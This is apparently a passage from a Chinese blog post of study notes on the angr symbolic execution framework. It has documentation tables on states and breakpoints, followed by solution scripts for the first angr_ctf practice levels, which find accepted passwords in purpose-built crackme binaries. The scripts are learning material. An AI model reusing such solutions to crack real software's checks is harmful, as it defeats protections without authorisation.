<td>A normal, satisfiable successor state to the state processed by the engine. The instruction pointer of this state may be symbolic (i.e., a computed jump based on user input), so the state might actually represent <em>several</em> potential continuations of execution going forward.</td>
</tr>
<tr>
<td><code>unsat_successors</code></td>
<td>False (can be symbolic, but constrained to False).</td>
<td>Can be symbolic.</td>
<td>Unsatisfiable successors. These are successors whose guard conditions can only be false (i.e., jumps that cannot be taken, or the default branch of jumps that <em>must</em> be taken).</td>
</tr>
<tr>
<td><code>flat_successors</code></td>
<td>True (can be symbolic, but constrained to True).</td>
<td>Concrete value.</td>
<td>As noted above, states in the  <code>successors</code>  list can have symbolic instruction pointers. This is rather confusing, as elsewhere in the code (i.e., in  <code>SimEngineVEX.process</code> , when it’s time to step that state forward), we make assumptions that a single program state only represents the execution of a single spot in the code. To alleviate this, when we encounter states in  <code>successors</code>  with symbolic instruction pointers, we compute all possible concrete solutions (up to an arbitrary threshold of 256) for them, and make a copy of the state for each such solution. We call this process “flattening”. These  <code>flat_successors</code>  are states, each of which has a different, concrete instruction pointer. For example, if the instruction pointer of a state in  <code>successors</code>  was  <code>X+5</code> , where  <code>X</code>  had constraints of  <code>X &gt; 0x800000</code>  and  <code>X &lt;= 0x800010</code> , we would flatten it into 16 different  <code>flat_successors</code>  states, one with an instruction pointer of  <code>0x800006</code> , one with  <code>0x800007</code> , and so on until  <code>0x800015</code> .</td>
</tr>
<tr>
<td><code>unconstrained_successors</code></td>
<td>True (can be symbolic, but constrained to True).</td>
<td>Symbolic (with more than 256 solutions).</td>
<td>During the flattening procedure described above, if it turns out that there are more than 256 possible solutions for the instruction pointer, we assume that the instruction pointer has been overwritten with unconstrained data (i.e., a stack overflow with user data). <em>This assumption is not sound in general</em>. Such states are placed in  <code>unconstrained_successors</code>  and not in  <code>successors</code> .</td>
</tr>
<tr>
<td><code>all_successors</code></td>
<td>Anything</td>
<td>Can be symbolic.</td>
<td>This is  <code>successors + unsat_successors + unconstrained_successors</code> .</td>
</tr>
</tbody>
</table>
<h4 id="breakpoints"><a class="markdownIt-Anchor" href="#breakpoints">#</a> Breakpoints</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> angr</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = angr.Project(<span class="string">&#x27;examples/fauxware/fauxware&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get our state</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = b.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a breakpoint. This breakpoint will drop into ipdb right before a memory write happens.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># on the other hand, we can have a breakpoint trigger right *after* a memory write happens.</span></span><br><span class="line"><span class="comment"># we can also have a callback function run instead of opening ipdb.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">debug_func</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&quot;State %s is about to do a memory write!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, when=angr.BP_AFTER, action=debug_func)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or, you can have it drop you in an embedded IPython!</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, when=angr.BP_AFTER, action=angr.BP_IPYTHON)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>Event type</th>
<th>Event meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>mem_read</td>
<td>Memory is being read.</td>
</tr>
<tr>
<td>mem_write</td>
<td>Memory is being written.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>A symbolic memory access is being resolved.</td>
</tr>
<tr>
<td>reg_read</td>
<td>A register is being read.</td>
</tr>
<tr>
<td>reg_write</td>
<td>A register is being written.</td>
</tr>
<tr>
<td>tmp_read</td>
<td>A temp is being read.</td>
</tr>
<tr>
<td>tmp_write</td>
<td>A temp is being written.</td>
</tr>
<tr>
<td>expr</td>
<td>An expression is being created (i.e., a result of an arithmetic operation or a constant in the IR).</td>
</tr>
<tr>
<td>statement</td>
<td>An IR statement is being translated.</td>
</tr>
<tr>
<td>instruction</td>
<td>A new (native) instruction is being translated.</td>
</tr>
<tr>
<td>irsb</td>
<td>A new basic block is being translated.</td>
</tr>
<tr>
<td>constraints</td>
<td>New constraints are being added to the state.</td>
</tr>
<tr>
<td>exit</td>
<td>A successor is being generated from execution.</td>
</tr>
<tr>
<td>fork</td>
<td>A symbolic execution state has forked into multiple states.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>A new symbolic variable is being created.</td>
</tr>
<tr>
<td>call</td>
<td>A call instruction is hit.</td>
</tr>
<tr>
<td>return</td>
<td>A ret instruction is hit.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>A simprocedure (or syscall) is executed.</td>
</tr>
<tr>
<td>dirty</td>
<td>A dirty IR callback is executed.</td>
</tr>
<tr>
<td>syscall</td>
<td>A syscall is executed (called in addition to the simprocedure event).</td>
</tr>
<tr>
<td>engine_process</td>
<td>A SimEngine is about to process some code.</td>
</tr>
</tbody>
</table>
<p>These events expose different attributes:</p>
<table>
<thead>
<tr>
<th>Event type</th>
<th>Attribute name</th>
<th>Attribute availability</th>
<th>Attribute meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>mem_read</td>
<td>mem_read_address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address at which memory is being read.</td>
</tr>
<tr>
<td>mem_read</td>
<td>mem_read_expr</td>
<td>BP_AFTER</td>
<td>The expression at that address.</td>
</tr>
<tr>
<td>mem_read</td>
<td>mem_read_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the memory read.</td>
</tr>
<tr>
<td>mem_read</td>
<td>mem_read_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the memory read.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address at which memory is being written.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the memory write.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression that is being written.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the memory write.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_offset</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The offset of the register being read.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the register read.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_expr</td>
<td>BP_AFTER</td>
<td>The expression in the register.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the register read.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_offset</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The offset of the register being written.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the register write.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression that is being written.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the register write.</td>
</tr>
<tr>
<td>tmp_read</td>
<td>tmp_read_num</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The number of the temp being read.</td>
</tr>
<tr>
<td>tmp_read</td>
<td>tmp_read_expr</td>
<td>BP_AFTER</td>
<td>The expression of the temp.</td>
</tr>
<tr>
<td>tmp_write</td>
<td>tmp_write_num</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The number of the temp written.</td>
</tr>
<tr>
<td>tmp_write</td>
<td>tmp_write_expr</td>
<td>BP_AFTER</td>
<td>The expression written to the temp.</td>
</tr>
<tr>
<td>expr</td>
<td>expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The IR expression.</td>
</tr>
<tr>
<td>expr</td>
<td>expr_result</td>
<td>BP_AFTER</td>
<td>The value (e.g. AST) which the expression was evaluated to.</td>
</tr>
<tr>
<td>statement</td>
<td>statement</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The index of the IR statement (in the IR basic block).</td>
</tr>
<tr>
<td>instruction</td>
<td>instruction</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the native instruction.</td>
</tr>
<tr>
<td>irsb</td>
<td>address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the basic block.</td>
</tr>
<tr>
<td>constraints</td>
<td>added_constraints</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The list of constraint expressions being added.</td>
</tr>
<tr>
<td>call</td>
<td>function_address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the function being called.</td>
</tr>
<tr>
<td>exit</td>
<td>exit_target</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression representing the target of a SimExit.</td>
</tr>
<tr>
<td>exit</td>
<td>exit_guard</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression representing the guard of a SimExit.</td>
</tr>
<tr>
<td>exit</td>
<td>exit_jumpkind</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression representing the kind of SimExit.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>symbolic_name</td>
<td>BP_AFTER</td>
<td>The name of the symbolic variable being created. The solver engine might modify this name (by appending a unique ID and length). Check the symbolic_expr for the final symbolic expression.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>symbolic_size</td>
<td>BP_AFTER</td>
<td>The size of the symbolic variable being created.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>symbolic_expr</td>
<td>BP_AFTER</td>
<td>The expression representing the new symbolic variable.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_strategy</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimConcretizationStrategy being used to resolve the address. This can be modified by the breakpoint handler to change the strategy that will be applied. If your breakpoint handler sets this to None, this strategy will be skipped.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_action</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimAction object being used to record the memory action.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_memory</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimMemory object on which the action was taken.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The AST representing the memory index being resolved. The breakpoint handler can modify this to affect the address being resolved.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_add_constraints</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>Whether or not constraints should/will be added for this read.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_result</td>
<td>BP_AFTER</td>
<td>The list of resolved memory addresses (integers). The breakpoint handler can overwrite these to effect a different resolution result.</td>
</tr>
<tr>
<td>syscall</td>
<td>syscall_name</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the system call.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure_name</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the simprocedure.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure_addr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the simprocedure.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure_result</td>
<td>BP_AFTER</td>
<td>The return value of the simprocedure. You can also <em>override</em> it in BP_BEFORE, which will cause the actual simprocedure to be skipped and for your return value to be used instead.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The actual SimProcedure object.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_name</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the dirty call.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_handler</td>
<td>BP_BEFORE</td>
<td>The function that will be run to handle the dirty call. You can override this.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_args</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the dirty.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_result</td>
<td>BP_AFTER</td>
<td>The return value of the dirty call. You can also <em>override</em> it in BP_BEFORE, which will cause the actual dirty call to be skipped and for your return value to be used instead.</td>
</tr>
<tr>
<td>engine_process</td>
<td>sim_engine</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimEngine that is processing.</td>
</tr>
<tr>
<td>engine_process</td>
<td>successors</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimSuccessors object defining the result of the engine.</td>
</tr>
</tbody>
</table>
<p>eg. 每当程序状态 <code>s</code>  执行内存读取时， <code>angr</code>  都会在读取完成后立即调用 <code>track_reads</code> ，打印出读取的值和发生读取的内存地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">track_reads</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&#x27;Read&#x27;</span>, state.inspect.mem_read_expr, <span class="string">&#x27;from&#x27;</span>, state.inspect.mem_read_address)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_read&#x27;</span>, when=angr.BP_AFTER, action=track_reads)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This will break before a memory write if 0x1000 is a possible value of its target expression</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, mem_write_address=<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This will break before a memory write if 0x1000 is the *only* value of its target expression</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, mem_write_address=<span class="number">0x1000</span>, mem_write_address_unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This will break after instruction 0x8000, but only 0x1000 is a possible value of the last expression that was read from memory</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;instruction&#x27;</span>, when=angr.BP_AFTER, instruction=<span class="number">0x8000</span>, mem_read_expr=<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure>
<p>声明函数作为 condition</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># this is a complex condition that could do anything! In this case, it makes sure that RAX is 0x41414141 and</span></span><br><span class="line"><span class="comment"># that the basic block starting at 0x8004 was executed sometime in this path&#x27;s history</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">cond</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> state.<span class="built_in">eval</span>(state.regs.rax, cast_to=<span class="built_in">str</span>) == <span class="string">&#x27;AAAA&#x27;</span> <span class="keyword">and</span> <span class="number">0x8004</span> <span class="keyword">in</span> state.inspect.backtrace</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, condition=cond)</span><br></pre></td></tr></table></figure>
<h5 id="caution-about-mem_read-breakpoint"><a class="markdownIt-Anchor" href="#caution-about-mem_read-breakpoint">#</a> Caution about  <code>mem_read</code>  breakpoint</h5>
<p>The  <code>mem_read</code>  breakpoint gets triggered anytime there are memory reads by either the executing program or the binary analysis. If you are using breakpoint on  <code>mem_read</code>  and also using  <code>state.mem</code>  to load data from memory addresses, then know that the breakpoint will be fired as you are technically reading memory.</p>
<p>So if you want to load data from memory and not trigger any  <code>mem_read</code>  breakpoint you have had set up, then use  <code>state.memory.load</code>  with the keyword arguments  <code>disable_actions=True</code>  and  <code>inspect=False</code> .</p>
<p>This is also true for  <code>state.find</code>  and you can use the same keyword arguments to prevent  <code>mem_read</code>  breakpoints from firing.</p>
<h3 id="analyses-2"><a class="markdownIt-Anchor" href="#analyses-2">#</a> Analyses</h3>
<p><a href="https://docs.angr.io/en/latest/extending-angr/analysis_writing.html#writing-analyses">Writing Analyses - angr documentation</a></p>
<p>the idea is that all the analyses appear under  <code>project.analyses</code>  (for example,  <code>project.analyses.CFGFast()</code> ) and can be called as functions, returning analysis result instances.</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>CFGFast</td>
<td>Constructs a fast <em>Control Flow Graph</em> of the program</td>
</tr>
<tr>
<td>CFGEmulated</td>
<td>Constructs an accurate <em>Control Flow Graph</em> of the program</td>
</tr>
<tr>
<td>VFG</td>
<td>Performs VSA on every function of the program, creating a <em>Value Flow Graph</em> and detecting stack variables</td>
</tr>
<tr>
<td>DDG</td>
<td>Calculates a <em>Data Dependency Graph</em>, allowing one to determine what statements a given value depends on</td>
</tr>
<tr>
<td>BackwardSlice</td>
<td>Computes a <em>Backward Slice</em> of a program with respect to a certain target</td>
</tr>
<tr>
<td>Identifier</td>
<td>Identifies common library functions in CGC binaries</td>
</tr>
<tr>
<td>More!</td>
<td>angr has quite a few analyses, most of which work! If you’d like to know how to use one, please submit an issue requesting documentation.</td>
</tr>
</tbody>
</table>
<h4 id="resilience"><a class="markdownIt-Anchor" href="#resilience">#</a> Resilience</h4>
<p>Analyses can be written to be resilient, and catch and log basically any error. These errors, depending on how they’re caught, are logged to the  <code>errors</code>  or  <code>named_errors</code>  attribute of the analysis. However, you might want to run an analysis in “fail fast” mode, so that errors are not handled. To do this, the argument  <code>fail_fast=True</code>  can be passed into the analysis constructor.</p>
<h3 id="symbolic-execution"><a class="markdownIt-Anchor" href="#symbolic-execution">#</a> Symbolic Execution</h3>
<h6 id="为什么这里是todo"><a class="markdownIt-Anchor" href="#为什么这里是todo">#</a> 为什么这里是 todo…</h6>
<p><a href="https://docs.angr.io/en/latest/core-concepts/symbolic.html">Symbolic Execution - angr documentation</a></p>
<h3 id="angr_ctf"><a class="markdownIt-Anchor" href="#angr_ctf">#</a> angr_ctf</h3>
<h6 id="官方给的样例文档里还有很多真实ctf比赛的例题orz初探就做到这里吧"><a class="markdownIt-Anchor" href="#官方给的样例文档里还有很多真实ctf比赛的例题orz初探就做到这里吧">#</a> 官方给的样例，文档里还有很多真实 ctf 比赛的例题 orz，初探就做到这里吧</h6>
<h4 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置">#</a> 环境配置</h4>
<p>添加环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export C_INCLUDE_PATH=/usr/include/x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
<p>支持编译 32 位程序包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>
<p>生成可执行程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 generate.py [seed] [output_file]</span><br></pre></td></tr></table></figure>
<h4 id="00_angr_find"><a class="markdownIt-Anchor" href="#00_angr_find">#</a> 00_angr_find</h4>
<p>直接找对应标准输出的输入即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line">s = simgr.found[<span class="number">0</span>]</span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h4 id="01_angr_avoid"><a class="markdownIt-Anchor" href="#01_angr_avoid">#</a> 01_angr_avoid</h4>
<p>main 函数的节点过多</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231024151111618-16981317398901.png" alt="image-20231024151111618"></p>
<p>可以看到 <code>avoid_me</code>  函数被大量调用</p>
<p>这里需要让 angr 走到 <code>avoid_me</code>  函数后就剪枝</p>
<p>可以使用函数传入所有需要 avoid 的状态</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_avoid</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># 检查输出是否包含&quot;Try again&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 检查当前地址是否是我们想要避免的地址</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == <span class="number">0x8049243</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 如果以上条件都不满足，那么我们不避免这个状态</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">simgr.explore(find = <span class="keyword">lambda</span> s1: <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> s1.posix.dumps(<span class="number">1</span>), avoid = should_avoid)</span><br><span class="line"></span><br><span class="line">s = simgr.found[<span class="number">0</span>]</span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h4 id="02_angr_find_condition"><a class="markdownIt-Anchor" href="#02_angr_find_condition">#</a> 02_angr_find_condition</h4>
<p>和上面一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_avoid</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">simgr.explore(find = <span class="keyword">lambda</span> s1: <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> s1.posix.dumps(<span class="number">1</span>), avoid = should_avoid)</span><br><span class="line"></span><br><span class="line">s = simgr.found[<span class="number">0</span>]</span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h4 id="03_angr_symbolic_registers"><a class="markdownIt-Anchor" href="#03_angr_symbolic_registers">#</a> 03_angr_symbolic_registers</h4>
<p>和上面一样可以打通</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_avoid</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># 检查输出是否包含&quot;Try again&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">simgr.explore(find = <span class="keyword">lambda</span> s1: <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> s1.posix.dumps(<span class="number">1</span>), avoid = should_avoid)</span><br><span class="line"></span><br><span class="line">s = simgr.found[<span class="number">0</span>]</span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>不过官方 exp 是打算让分段打（yysy，看起来没啥用，也就是省去了初始化的一些时间，不会优化太多）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Angr doesn&#x27;t currently support reading multiple things with scanf (Ex: </span></span><br><span class="line"><span class="comment"># scanf(&quot;%u %u).) You will have to tell the simulation engine to begin the</span></span><br><span class="line"><span class="comment"># program after scanf is called and manually inject the symbols into registers.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sometimes, you want to specify where the program should start. The variable</span></span><br><span class="line">  <span class="comment"># start_address will specify where the symbolic execution engine should begin.</span></span><br><span class="line">  <span class="comment"># Note that we are using blank_state, not entry_state.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  start_address = <span class="number">0x80488c7</span>  <span class="comment"># :integer (probably hexadecimal)</span></span><br><span class="line">  initial_state = project.factory.blank_state(</span><br><span class="line">    addr=start_address,</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Create a symbolic bitvector (the datatype Angr uses to inject symbolic</span></span><br><span class="line">  <span class="comment"># values into the binary.) The first parameter is just a name Angr uses</span></span><br><span class="line">  <span class="comment"># to reference it. </span></span><br><span class="line">  <span class="comment"># You will have to construct multiple bitvectors. Copy the two lines below</span></span><br><span class="line">  <span class="comment"># and change the variable names. To figure out how many (and of what size)</span></span><br><span class="line">  <span class="comment"># you need, dissassemble the binary and determine the format parameter passed</span></span><br><span class="line">  <span class="comment"># to scanf.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password0_size_in_bits = <span class="number">32</span>  <span class="comment"># :integer</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, password0_size_in_bits)</span><br><span class="line"></span><br><span class="line">  password1_size_in_bits = <span class="number">32</span>  <span class="comment"># :integer</span></span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, password1_size_in_bits)</span><br><span class="line"></span><br><span class="line">  password2_size_in_bits = <span class="number">32</span>  <span class="comment"># :integer</span></span><br><span class="line">  password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, password2_size_in_bits)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Set a register to a symbolic value. This is one way to inject symbols into</span></span><br><span class="line">  <span class="comment"># the program.</span></span><br><span class="line">  <span class="comment"># initial_state.regs stores a number of convenient attributes that reference</span></span><br><span class="line">  <span class="comment"># registers by name. For example, to set eax to password0, use:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># initial_state.regs.eax = password0</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># You will have to set multiple registers to distinct bitvectors. Copy and</span></span><br><span class="line">  <span class="comment"># paste the line below and change the register. To determine which registers</span></span><br><span class="line">  <span class="comment"># to inject which symbol, dissassemble the binary and look at the instructions</span></span><br><span class="line">  <span class="comment"># immediately following the call to scanf.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state.regs.eax = password0</span><br><span class="line">  initial_state.regs.ebx = password1</span><br><span class="line">  initial_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span 